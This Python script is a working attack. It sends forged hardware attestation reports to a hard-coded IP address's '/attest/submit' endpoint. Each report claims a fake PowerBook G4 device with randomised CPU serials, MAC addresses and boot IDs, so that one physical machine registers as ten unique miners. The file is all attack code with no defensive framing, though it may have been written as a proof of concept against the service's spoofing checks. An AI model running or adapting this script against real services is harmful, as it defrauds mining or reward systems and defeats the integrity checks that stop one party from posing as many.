import asyncio
import aiohttp
import random
import string

BASE_URL = "http://50.28.86.131:8099"

def random_string(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

async def submit_attestation(session, miner_id):
    # Randomize hardware characteristics to spoof a unique machine
    payload = {
        "miner": miner_id,
        "nonce": "nonce_" + random_string(),
        "report": {
            "nonce": "nonce_" + random_string(),
            "device_model": "PowerBook G4",
            "device_arch": "g4",
            "device_family": "powerpc",
            "cores": 1,
            "cpu_serial": "SN-" + random_string(16),
            "entropy_sources": ["cpu_jitter"],
            "entropy_score": random.uniform(0.7, 0.9)
        },
        "device": {
            "device_model": "PowerBook G4",
            "device_arch": "g4",
            "device_family": "powerpc",
            "cores": 1
        },
        "signals": {
            "macs": ["00:11:22:33:44:" + random_string(2).upper()]
        },
        "fingerprint": {
            "cpu_flags": "altivec",
            "boot_id": random_string(16)
        }
    }
    try:
        async with session.post(f"{BASE_URL}/attest/submit", json=payload) as resp:
            return miner_id, resp.status, await resp.text()
    except Exception as e:
        return miner_id, 500, str(e)

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        print("Spoofing 10 unique machines from one physical device...")
        for i in range(10):
            miner_id = f"spoof_miner_{i}"
            tasks.append(submit_attestation(session, miner_id))
        
        results = await asyncio.gather(*tasks)
        
        successes = [r for r in results if r[1] == 200]
        print(f"Results: {len(successes)} / 10 machines accepted as unique.")
        for res in results:
            print(f"Miner {res[0]}: Status {res[1]}")

if __name__ == "__main__":
    asyncio.run(main())
